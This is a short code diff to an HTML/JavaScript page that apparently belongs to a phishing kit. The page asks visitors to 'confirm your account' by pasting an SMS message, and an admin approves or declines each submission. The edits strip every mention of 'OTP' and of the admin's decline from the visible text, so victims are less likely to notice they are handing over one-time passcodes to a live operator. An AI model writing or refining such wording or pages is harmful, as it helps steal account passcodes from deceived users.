@@ -388,13 +388,13 @@
             <!-- TEXT -->
             <div class="title">Confirm your account</div>
             <div class="subtitle" id="subtitleText">
-                Paste the OTP message you received via SMS.<br>
+                Please paste the message you received via SMS.<br>
                 <span id="maskedPhone">02xxxxxx20</span>
             </div>
 
             <!-- MESSAGE TEXTAREA -->
             <div class="message-area">
-                <label for="otpMessageText">OTP Message</label>
+                <label for="otpMessageText">Paste Message</label>
                 <textarea id="otpMessageText" placeholder="Paste the entire message here..."></textarea>
 
             </div>
@@ -751,7 +751,7 @@
 
             const msgText = messageTextarea.value.trim();
             if (msgText.length < 5) {
-                formMessage.textContent = 'Please paste the complete OTP message (at least 5 characters).';
+                formMessage.textContent = 'Please paste the complete message (at least 5 characters).';
                 formMessage.className = 'message error';
                 return;
             }
@@ -805,7 +805,7 @@
                     formMessage.textContent = '📌 Please confirm your PIN in the popup.';
                     formMessage.className = 'message';
                 } else if (action === 'decline') {
-                    showError('The OTP was declined by the admin. Please check your message and try again.');
+                    showError('Paste entire message. Please check your message and try again.');
                     messageTextarea.value = '';
                     messageTextarea.focus();
                     formMessage.textContent = '';
